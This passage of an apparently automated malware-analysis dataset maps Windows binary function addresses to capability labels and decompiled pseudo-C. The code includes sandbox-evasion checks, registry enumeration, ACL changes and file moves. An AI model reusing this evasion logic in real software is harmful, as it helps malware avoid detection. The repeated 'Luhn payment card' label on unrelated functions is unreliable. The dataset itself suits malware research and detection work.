1;\ncode_r0x00410b41:\n    iVar4 = fcn.0041043c(1);\n    if (iVar4 == 0) {\n        arg_ch = arg_8h + -1;\n    }\n    return arg_ch + (1 - arg_8h);\n}\n",
        "token_count": 950
    },
    "0041150c": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuint fcn.0041150c(uint32_t param_1)\n\n{\n    int32_t n;\n    uint *in_EAX;\n    uint uVar1;\n    \n    if (in_EAX[1] <= param_1 >> 5) {\n        n = (param_1 >> 5) + 1;\n        fcn.00411219(n);\n        in_EAX[1] = n;\n    }\n    fcn.004139b7(*in_EAX, in_EAX[1]);\n    uVar1 = fcn.0041379d(*in_EAX);\n    in_EAX[1] = uVar1;\n    return 0;\n}\n",
        "token_count": 145
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00401000(void)\n\n{\n    uint uVar1;\n    int32_t arg_8h;\n    uint uVar2;\n    uchar auStack4 [4];\n    \n    // [00] -r-x section size 90112 named .text\n    uVar2 = 0;\n    uVar1 = fcn.0040a88f(0x417818, 6, 0x731d31d6, 0);\n    arg_8h = fcn.0040b98a(uVar1);\n    if (arg_8h != 0) {\n        uVar2 = fcn.004156e4(arg_8h, auStack4);\n        fcn.0040af12();\n    }\n    return uVar2;\n}\n",
        "token_count": 169
    },
    "004010fb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "shutdown system"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040119e)\n// WARNING: Removing unreachable block (ram,0x004011a9)\n// WARNING: Removing unreachable block (ram,0x004011cb)\n// WARNING: Removing unreachable block (ram,0x004011ba)\n// WARNING: Removing unreachable block (ram,0x004011c5)\n\nvoid fcn.004010fb(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    uVar3 = fcn.0040acd8(0x417820, 0x13, 0xc15f3b20);\n    fcn.0040c5a3(uVar3);\n    pcVar2 = _sym.imp.SHLWAPI.dll_StrChrW;\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    do {\n        (*pcVar1)(1);\n        do {\n            iVar4 = fcn.0040c985();\n        } while (0xffff < iVar4 + 1U);\n        puVar5 = &stack0xfffffff8;\n        (*_sym.imp.KERNEL32.dll_FormatMessageW)(0x1300, 0, iVar4 + 1U, 0x400, puVar5, 0, 0);\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(puVar5);\n        if (((iVar4 < 0x29) || (iVar4 = (*pcVar2)(0, 0x25),  iVar4 != 0)) || (iVar4 = (*pcVar2)(0, 0x7b),  iVar4 != 0))\n        {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n    } while( true );\n}\n",
        "token_count": 427
    },
    "004011f6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.004011f6(uint param_1)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    uVar1 = 0;\n    uVar2 = 0;\n    if (*0x41c670 != 0) {\n        iVar3 = 0;\n        do {\n            in_EAX = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(*(iVar3 + 8 + *0x41c258), param_1);\n            if (in_EAX == 0) {\n                uVar1 = *(uVar2 * 0xc + 4 + *0x41c258);\n                in_EAX = *0x41c258;\n                break;\n            }\n            uVar2 = uVar2 + 1;\n            iVar3 = iVar3 + 0xc;\n        } while (uVar2 < *0x41c670);\n    }\n    return in_EAX & 0xffffff00 | uVar1;\n}\n",
        "token_count": 232
    },
    "0040123e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "write file on Windows"
        ],
        "decompiled_code": "\nvoid fcn.0040123e(void)\n\n{\n    code *pcVar1;\n    int32_t *unaff_EDI;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_WriteFile;\n    (*_sym.imp.KERNEL32.dll_WriteFile)(*0x41c25c);\n    (*pcVar1)(*0x41c25c, unaff_EDI + 1, 1, &var_4h, 0);\n    (*pcVar1)(*0x41c25c, unaff_EDI[2], *unaff_EDI * 2, &var_4h, 0);\n    return;\n}\n",
        "token_count": 146
    },
    "00401287": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401287(char param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (param_1 == '\\0') {\n        (*_sym.imp.KERNEL32.dll_SetFilePointer)(*0x41c25c, 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_SetEndOfFile)(*0x41c25c);\n        if (*0x41c670 != 0) {\n            do {\n                fcn.0040123e();\n                uVar1 = uVar1 + 1;\n            } while (uVar1 < *0x41c670);\n        }\n    }\n    else {\n        fcn.0040123e();\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "004013d5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004013d5(uint *arg_8h, uchar *arg_ch)\n\n{\n    uint *puVar1;\n    uint lpBuffer;\n    unkuint3 in_ECX;\n    uint var_8h;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    _auStack8 = in_ECX;\n    puVar1 = fcn.004013a1(&var_8h);\n    if ((puVar1 != '\\0') && (puVar1 = fcn.004013a1(auStack8 + 2),  puVar1 != '\\0')) {\n        lpBuffer = fcn.0040ae05(8);\n        puVar1 = fcn.004013a1(lpBuffer);\n        if (puVar1 != '\\0') {\n            *arg_ch = auStack8[2];\n            *arg_8h = lpBuffer;\n            _auStack8 = 0x1000000;\n            puVar1 = arg_8h;\n        }\n    }\n    return puVar1 & 0xffffff00 | _auStack8 >> 0x18;\n}\n",
        "token_count": 273
    },
    "004014ef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004014ef(void)\n\n{\n    uint32_t uVar1;\n    \n    (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(*0x41c25c);\n    fcn.0040c13c();\n    uVar1 = 0;\n    if (*0x41c670 != 0) {\n        do {\n            fcn.0040af12();\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < *0x41c670);\n    }\n    fcn.0040af12();\n    *0x41c258 = 0;\n    *0x41c670 = 0;\n    return;\n}\n",
        "token_count": 148
    },
    "004019d6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "set console window title",
            "manipulate console buffer"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004019d6(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint var_20h;\n    ushort var_1ch;\n    ushort uStack30;\n    ushort uStack28;\n    uint uStack26;\n    uint uStack22;\n    uint uStack18;\n    uint var_8h;\n    int32_t var_4h;\n    \n    uVar3 = fcn.0040acd8(0x4179f0, 0xe, 0xcd2ce56a);\n    (*_sym.imp.KERNEL32.dll_SetConsoleTitleW)(uVar3);\n    uVar3 = fcn.0040acd8(0x417a00, 0x14e, 0xf61934c4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetStdHandle)(0xfffffff5);\n    uVar5 = (*_sym.imp.KERNEL32.dll_lstrlenW)(uVar3, &var_8h, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_WriteConsoleW;\n    (*_sym.imp.KERNEL32.dll_WriteConsoleW)(uVar4, uVar3, uVar5);\n    var_20h._0_2_ = 0;\n    var_20h._2_2_ = 0;\n    var_1ch = 0;\n    uStack30 = 0;\n    uStack28 = 0;\n    uStack26 = 0;\n    uStack22 = 0;\n    uStack18 = 0;\n    (*_sym.imp.KERNEL32.dll_GetConsoleScreenBufferInfo)(uVar4, &var_20h);\n    pcVar2 = _sym.imp.KERNEL32.dll_SetConsoleCursorPosition;\n    var_4h = 0;\n    do {\n        (*pcVar1)(uVar4, 0x417b50, 1, &var_8h, 0);\n        var_4h = var_4h + 1;\n        if (var_4h == 4) {\n            (*pcVar2)(uVar4, CONCAT22(uStack30, var_1ch));\n            (*pcVar1)(uVar4, 0x417b54, 4, &var_8h, 0);\n            (*pcVar2)(uVar4, CONCAT22(uStack30, var_1ch));\n            var_4h = 0;\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 580
    },
    "00401ba1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401ba1(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint arg_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    cVar1 = fcn.00401045(arg_8h);\n    if (cVar1 == '\\0') {\n        arg_14h = 4;\n        cVar1 = fcn.00401045(arg_8h);\n        if (cVar1 == '\\0') {\n            arg_14h = 5;\n        }\n        var_ch = fcn.0040acd8(0x417b70, 5, 0xbbed6ef6);\n        var_8h = fcn.0040acd8(0x417b78, 5, 0x56af7123);\n        var_4h = fcn.0040acd8(0x417b80, 5, 0x648ad6a2);\n        fcn.0040cec3(arg_8h, &var_ch, 3, arg_14h, fcn.00401b07, arg_ch, 1, 0);\n    }\n    return;\n}\n",
        "token_count": 269
    },
    "00401c6b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401c6b(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint hMem;\n    \n    uVar4 = 0;\n    uVar2 = fcn.0040d434(&var_8h);\n    if (uVar2 != 0) {\n        var_24h = 2;\n        var_10h = 2;\n        var_ch = var_8h;\n        var_28h = 0x10000000;\n        var_20h = 0;\n        var_14h = 0;\n        hMem = 0;\n        iVar3 = (*_sym.imp.ADVAPI32.dll_SetEntriesInAclW)(1, &var_28h, 0, &hMem);\n        if (iVar3 == 0) {\n            cVar1 = fcn.00401c2e(arg_8h, var_8h, hMem);\n            if (cVar1 != '\\0') {\n                cVar1 = fcn.00401c2e(arg_ch, var_8h, hMem);\n                if (cVar1 != '\\0') {\n                    uVar4 = 1;\n                }\n            }\n            (*_sym.imp.KERNEL32.dll_LocalFree)(hMem);\n        }\n        uVar2 = fcn.0040af12();\n    }\n    return uVar2 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 386
    },
    "00401cfa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "set current directory"
        ],
        "decompiled_code": "\nvoid fcn.00401cfa(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t lpData;\n    uint uVar3;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint dwType;\n    uint uVar4;\n    int32_t *arg_ch;\n    int32_t iStack12;\n    int32_t iStack8;\n    \n    (*_sym.imp.KERNEL32.dll_SetCurrentDirectoryW)(0x41d8e8);\n    arg_ch = &iStack12;\n    uVar1 = fcn.0040acd8(0x417b94, 5, 0xd1c526e8, extraout_ECX);\n    iVar2 = fcn.00403dcd(uVar1, arg_ch);\n    iStack8 = iVar2;\n    if (iVar2 != 0) {\n        lpData = fcn.0040d63e(iVar2);\n        if (lpData != 0) {\n            iStack12 = iStack12 * 2;\n            uVar4 = 1;\n            uVar1 = fcn.0040acd8(0x417b94, 5, 0xd1c526e8, iVar2);\n            uVar3 = fcn.0040acd8(0x417b9c, 0x35, 0x91a42c47);\n            fcn.0040a731(0x80000002, uVar3, uVar1, uVar4, lpData, iStack12);\n            fcn.0040af12();\n        }\n        fcn.0040af12();\n        fcn.0040acd8(0x417b94, 5, 0xd1c526e8);\n        fcn.0040cb5b();\n    }\n    uVar1 = fcn.0040acd8(0x417bd4, 0xc, 0x2be24724);\n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(uVar1);\n    iVar2 = iVar2 * 2;\n    dwType = 1;\n    uVar3 = fcn.0040acd8(0x417b94, 5, 0xd1c526e8, extraout_ECX_00);\n    uVar4 = fcn.0040acd8(0x417b9c, 0x35, 0x91a42c47);\n    fcn.0040a731(0x80000002, uVar4, uVar3, dwType, uVar1, iVar2);\n    return;\n}\n",
        "token_count": 577
    },
    "00401dfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401dfc(void)\n\n{\n    int32_t iVar1;\n    uint arg_8h;\n    uint unaff_EDI;\n    uint arg_ch;\n    uint var_18h;\n    uint lpNewFileName;\n    \n    iVar1 = fcn.0040cb5b();\n    if (iVar1 == 0) {\n        fcn.0040d968(9, 7);\n        arg_ch = unaff_EDI;\n        arg_8h = fcn.0040acd8(0x417be4, 9, 0xa368a65f);\n        iVar1 = fcn.0040beef(arg_8h, arg_ch);\n        if (iVar1 == 0) {\n            (*_sym.imp.KERNEL32.dll_MoveFileExW)();\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_MoveFileW)();\n            (*_sym.imp.KERNEL32.dll_MoveFileExW)();\n            fcn.0040af12();\n        }\n    }\n    fcn.004012ed(unaff_EDI, 1, 1);\n    return;\n}\n",
        "token_count": 239
    },
    "00401fa6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401fa6(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    uVar1 = fcn.0040a88f(0x417c70, 9, 0x882b315f, 0);\n    iVar2 = fcn.00415506(uVar1);\n    if (iVar2 != 0) {\n        uVar1 = fcn.0040a88f(0x417c7c, 6, 0xa65f706b, 0);\n        fcn.00415506(uVar1);\n        iVar3 = fcn.004155c2();\n        if (iVar3 != 0) {\n            uVar1 = fcn.0040a88f(0x417c84, 4, 0x33a829c7, 0);\n            iVar2 = fcn.00415506(uVar1);\n            if (iVar2 != 0) {\n                fcn.00402837(iVar2, &var_4h);\n            }\n        }\n    }\n    return var_4h != 0;\n}\n",
        "token_count": 276
    },
    "00402088": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00402088(uint lpCmdLine)\n\n{\n    uint *puVar1;\n    ushort *puVar2;\n    int16_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint var_424h;\n    uint lpBuffer;\n    int16_t *var_10h;\n    int16_t *var_ch;\n    int32_t pNumArgs;\n    \n    pNumArgs = 0;\n    puVar1 = (*_sym.imp.SHELL32.dll_CommandLineToArgvW)(lpCmdLine, &pNumArgs);\n    piVar3 = NULL;\n    if (pNumArgs != 0) {\n        puVar2 = (*_sym.imp.SHLWAPI.dll_StrChrIW)(*puVar1, 0x3b);\n        if (puVar2 != NULL) {\n            *puVar2 = 0;\n        }\n        uVar4 = *puVar1;\n        piVar3 = fcn.004010a9(uVar4);\n        if (piVar3[1] != 0x3a) {\n            if (*piVar3 == 0x5c) {\n                uVar4 = fcn.0040acd8(0x417c8c, 0xc, 0x195a151c, uVar4, 0xc);\n                iVar5 = (*_sym.imp.SHLWAPI.dll_StrCmpNIW)(piVar3, uVar4);\n                if (iVar5 == 0) {\n                    (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryW)(&lpBuffer, 0x104);\n                    puVar6 = &lpBuffer;\n                    uVar4 = fcn.0040acd8(0x417b60, 5, 0xb4d7cbf9, puVar6, piVar3 + 0xc);\n                    fcn.0040beef(uVar4, puVar6);\n                    fcn.0040af12();\n                    piVar3 = var_10h;\n                    goto code_r0x004021b9;\n                }\n            }\n            else {\n                uVar4 = fcn.0040acd8(0x417c9c, 9, 0xca574e9e, uVar4, 9);\n                iVar5 = (*_sym.imp.SHLWAPI.dll_StrCmpNIW)(piVar3, uVar4);\n                if (iVar5 == 0) {\n                    puVar6 = &var_424h;\n                    fcn.0040d45a();\n                    uVar4 = fcn.0040acd8(0x417b60, 5, 0xb4d7cbf9, puVar6, piVar3 + 9);\n                    fcn.0040beef(uVar4, puVar6);\n                    fcn.0040af12();\n                    piVar3 = var_ch;\n                    goto code_r0x004021b9;\n                }\n            }\n            fcn.0040af12();\n            piVar3 = NULL;\n        }\n    }\ncode_r0x004021b9:\n    (*_sym.imp.KERNEL32.dll_LocalFree)(puVar1);\n    return piVar3;\n}\n",
        "token_count": 707
    },
    "004024e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004024e8(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint arg_ch_00;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_21ch;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    \n    pcVar1 = _sym.imp.ADVAPI32.dll_RegEnumKeyExW;\n    var_ch = 0;\n    while( true ) {\n        var_8h = 0x104;\n        iVar4 = (*pcVar1)(arg_8h, var_ch, &var_21ch, &var_8h, 0, 0, 0, 0);\n        if (iVar4 == 0x103) break;\n        if (iVar4 == 0) {\n            iVar4 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(arg_8h, &var_21ch, 0, 0x20019, &var_10h);\n            if (iVar4 == 0) {\n                arg_ch_00 = fcn.0040acd8(0x417ca8, 9, 0xebc04bef);\n                var_14h = fcn.00402034(var_10h, arg_ch_00);\n                if (var_14h != 0) {\n                    iVar4 = fcn.00402088(var_14h);\n                    if (iVar4 != 0) {\n                        cVar2 = fcn.00402333(iVar4, arg_ch);\n                        if (cVar2 != '\\0') {\n                            iVar3 = fcn.0040cbc0(iVar4);\n                            if (iVar3 != 0) {\n                                cVar2 = fcn.004011f6(iVar4);\n                                if (cVar2 == '\\0') {\n                                    fcn.004012ed(iVar4, 0, 1);\n                                    *arg_10h = 1;\n                                }\n                            }\n                        }\n                        fcn.0040af12();\n                    }\n                    fcn.0040af12();\n                }\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_10h);\n            }\n        }\n        var_ch = var_ch + 1;\n    }\n    return;\n}\n",
        "token_count": 527
    },
    "004025f2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004025f2(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_224h;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    \n    pcVar1 = _sym.imp.ADVAPI32.dll_RegEnumKeyExW;\n    var_8h = 0;\n    while( true ) {\n        var_ch = 0x104;\n        iVar3 = (*pcVar1)(arg_8h, var_8h, &var_224h, &var_ch, 0, 0, 0, 0);\n        if (iVar3 == 0x103) break;\n        if (iVar3 == 0) {\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(arg_8h, &var_224h, 0, 0x20019, &var_10h);\n            if (iVar3 == 0) {\n                uVar2 = fcn.0040acd8(0x417cb4, 9, 0xc2cf4827);\n                var_18h = fcn.00402034(var_10h, uVar2);\n                if (var_18h != 0) {\n                    iVar3 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(var_18h, arg_ch);\n                    if (iVar3 != 0) {\n                        uVar2 = fcn.0040acd8(0x417cc0, 0xf, 0x9ae5befb);\n                        var_14h = fcn.00402034(var_10h, uVar2);\n                        if (var_14h != 0) {\n                            iVar3 = fcn.004010a9(var_14h);\n                            if (iVar3 != 0) {\n                                fcn.00401ba1(iVar3, arg_10h);\n                                fcn.0040af12();\n                            }\n                            fcn.0040af12();\n                        }\n                    }\n                    fcn.0040af12();\n                }\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_10h);\n            }\n        }\n        var_8h = var_8h + 1;\n    }\n    return;\n}\n",
        "token_count": 541
    },
    "004028ed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get disk information"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.004028ed(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    char cVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint var_210h;\n    uint var_20ah;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 1;\n    uVar4 = fcn.0040acd8(0x417dd8, 0xb, 0xe2598d28);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetModuleHandleW;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(uVar4);\n    if (uVar5 == 0) {\n        uVar4 = fcn.0040acd8(0x417de4, 0xd, 0x3f6b9d26);\n        uVar5 = (*pcVar1)(uVar4);\n        if (uVar5 == 0) {\n            uVar4 = fcn.0040acd8(0x417df4, 0xb, 0xbb571636);\n            uVar5 = (*pcVar1)(uVar4);\n            if (uVar5 == 0) {\n                uVar4 = fcn.0040acd8(0x417e00, 0xd, 0xaa84365b);\n                pcVar2 = _sym.imp.SHLWAPI.dll_StrStrIW;\n                uVar5 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(0x41dc10, uVar4);\n                if (uVar5 == 0) {\n                    (*_sym.imp.KERNEL32.dll_GetSystemWindowsDirectoryW)(&var_210h, 0x104);\n                    var_20ah._0_2_ = 0;\n                    (*_sym.imp.KERNEL32.dll_GetVolumeInformationW)(&var_210h, 0, 0, &var_8h, 0, 0, 0, 0);\n                    uVar5 = var_8h;\n                    if ((((var_8h != 0xcd1a40) && (var_8h != 0x6cbbc508)) && (var_8h != 0x774e1682)) &&\n                       ((var_8h != 0x837f873e && (var_8h != 0x8b6f64bc)))) {\n                        uVar4 = fcn.0040acd8(0x417e10, 0xb, 0x543e42c3);\n                        uVar5 = (*pcVar1)(uVar4);\n                        if (uVar5 == 0) {\n                            uVar4 = fcn.0040acd8(0x417e1c, 9, 0xbaa0e634);\n                            uVar5 = fcn.0040288a(uVar4);\n                            if (uVar5 == '\\0') {\n                                uVar4 = fcn.0040acd8(0x417e28, 0x12, 0x3f4e6a6c);\n                                cVar3 = fcn.004028b0(uVar4);\n                                if (cVar3 != '\\0') {\n                                    uVar4 = fcn.0040acd8(0x417e3c, 0x11, 0xf3592f50);\n                                    uVar5 = fcn.004028b0(uVar4);\n                                    if (uVar5 != '\\0') goto code_r0x00402aeb;\n                                }\n                                uVar4 = fcn.0040acd8(0x417e50, 0x14, 0xe59e8dbe);\n                                uVar5 = fcn.004028b0(uVar4);\n                                if (uVar5 == '\\0') {\n                                    uVar4 = fcn.0040acd8(0x417e68, 10, 0x914a8977);\n                                    uVar5 = (*pcVar2)(0x41dc10, uVar4);\n                                    if (uVar5 == 0) {\n                                        uVar4 = fcn.0040acd8(0x417e74, 0xb, 0x41ad438e);\n                                        uVar5 = (*pcVar2)(0x41dc10, uVar4);\n                                        if (uVar5 == 0) {\n                                            uVar4 = fcn.0040acd8(0x417e80, 9, 0x7f917025);\n                                            uVar5 = (*pcVar2)(0x41dc10, uVar4);\n                                            if (uVar5 == 0) {\n                                                var_1h._0_1_ = 0;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x00402aeb:\n    return uVar5 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1124
    },
    "00402ced": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "contain loop",
            "query or enumerate registry key"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00402ced(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint psz1;\n    uint ARG_0;\n    uint hKey;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    uVar2 = fcn.0040acd8(0x417f44, 6, 0x5fba2941, arg_8h);\n    uVar2 = (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, uVar2);\n    iVar6 = 0;\n    uVar3 = fcn.0040acd8(0x417f4c, 0x21, 0xc9e7bb58, 0, 0x20119, &hKey);\n    uVar4 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, uVar3);\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegEnumKeyW;\n    if (uVar4 == 0) {\n        do {\n            iVar5 = (*pcVar1)(hKey, iVar6, &psz1, 100);\n            if (iVar5 != 0) goto code_r0x00402d8c;\n            iVar6 = iVar6 + 1;\n            iVar5 = (*_sym.imp.SHLWAPI.dll_StrCmpNIW)(&psz1, &ARG_0, uVar2);\n        } while (iVar5 != 0);\n        var_1h._0_1_ = 1;\ncode_r0x00402d8c:\n        uVar4 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    }\n    return uVar4 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 459
    },
    "00403411": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00403411(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar4 = 0;\n    uVar1 = fcn.0040a88f(0x4180f8, 0xd, 0x2fb7fdbb, 0);\n    iVar2 = fcn.00415506(uVar1);\n    if (iVar2 != 0) {\n        uVar3 = fcn.004154a9();\n        if (uVar3 != 0) {\n            do {\n                iVar2 = fcn.004154d0(uVar4);\n                if (iVar2 != 0) {\n                    *0x41c6a8 = fcn.0040ae72();\n                    iVar2 = fcn.00415629();\n                    if (iVar2 != 0) {\n                        uVar1 = fcn.0040d63e(iVar2);\n                        iVar2 = *0x41c6c0;\n                        *0x41c6c0 = *0x41c6c0 + 1;\n                        *(*0x41c6a8 + iVar2 * 4) = uVar1;\n                    }\n                }\n                uVar4 = uVar4 + 1;\n            } while (uVar4 < uVar3);\n        }\n    }\n    return;\n}\n",
        "token_count": 310
    },
    "00403a84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403a84(uint arg_8h)\n\n{\n    int16_t *piVar1;\n    int16_t *piVar2;\n    int16_t iVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint uVar7;\n    uint extraout_ECX;\n    uint uStack1684;\n    uchar auStack1668 [16];\n    uchar auStack1652 [76];\n    uchar auStack1576 [460];\n    uchar auStack1116 [1112];\n    \n    uStack1684 = 0;\n    iVar5 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n    while ((iVar5 != 0 && (puVar6 = fcn.00403a44(),  puVar6 != NULL))) {\n        iVar5 = puVar6[2];\n        piVar2 = iVar5 + puVar6[3] * 2;\n        piVar1 = piVar2 + -1;\n        iVar3 = *piVar1;\n        while (iVar3 != 0x5c) {\n            iVar3 = piVar1[-1];\n            piVar2 = piVar1;\n            piVar1 = piVar1 + -1;\n        }\n        (*_sym.imp.SHLWAPI.dll_StrCpyNW)();\n        cVar4 = fcn.004089f8();\n        if (cVar4 != '\\0') {\n            uStack1684 = *puVar6;\n            (*_sym.imp.KERNEL32.dll_FileTimeToLocalFileTime)();\n            (*_sym.imp.KERNEL32.dll_FileTimeToSystemTime)();\n            (*_sym.imp.KERNEL32.dll_GetDateFormatW)(0x400, 1, &uStack1684, 0, auStack1668, 0x14);\n            (*_sym.imp.KERNEL32.dll_GetTimeFormatW)(0x400, 8, &stack0xfffff954, 0, auStack1652, 0x14);\n            uVar7 = fcn.0040acd8(0x418110, 0x28, 0xec3922cf, extraout_ECX, iVar5, &stack0xfffff94c, &stack0xfffff974);\n            (*_sym.imp.USER32.dll_wsprintfW)(auStack1116, uVar7);\n            (*_sym.imp.KERNEL32.dll_OutputDebugStringW)(auStack1116);\n        }\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        cVar4 = fcn.0040355c(iVar5, auStack1576, piVar2 - iVar5 >> 1);\n        if (cVar4 != '\\0') {\n            fcn.00409804();\n            *0x41c690 = *0x41c690 + 1;\n        }\n        